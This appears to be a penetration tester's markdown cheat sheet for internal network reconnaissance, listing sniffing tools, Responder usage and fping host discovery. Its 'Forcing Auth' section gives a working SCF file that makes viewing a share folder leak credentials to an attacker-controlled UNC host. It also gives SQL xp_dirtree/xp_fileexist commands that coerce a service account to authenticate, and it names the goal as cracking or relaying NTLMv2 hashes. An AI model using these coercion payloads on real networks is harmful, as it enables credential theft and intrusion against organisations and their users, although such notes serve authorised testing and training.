# Passive
## Wireshark
```
sudo -E wireshark
```
```
ARP Packet
```
```
MDNS
```
## Host without GUI
```
https://linux.die.net/man/8/tcpdump
```
```
sudo tcpdump -i ens224
```
```
https://github.com/DanMcInerney/net-creds
```
```
https://www.netminer.com/en/product/netminer.php
```
## Wndows Host
```
pktmon.exe
```
```
https://buckets.grayhatwarfare.com/
```
## Responder
```
sudo responder -I ens224 -A
```
### Forcing Auth
Responder only catches what's already broadcasting. To get hosts talking, drop an SCF file in a writable share (triggers on folder view, no click needed):
```
[Shell]
Command=2
IconFile=\\172.16.5.225\share\pwn.ico
[Taskbar]
Command=ToggleDesktop
```
Or coerce a SQL service account via `xp_dirtree`/`xp_fileexist` against a UNC path:
```
EXEC master..xp_dirtree '\\172.16.5.225\share\', 1, 1
```
```
EXEC master..xp_fileexist '\\172.16.5.225\share\'
```
Either way the target authenticates to our Responder listener, giving us its NTLMv2 hash to crack or relay.
## Active
# fping
```
https://fping.org/
```
```
fping -asgq 172.16.5.0/23
```
nmap scan to the hosts discovered above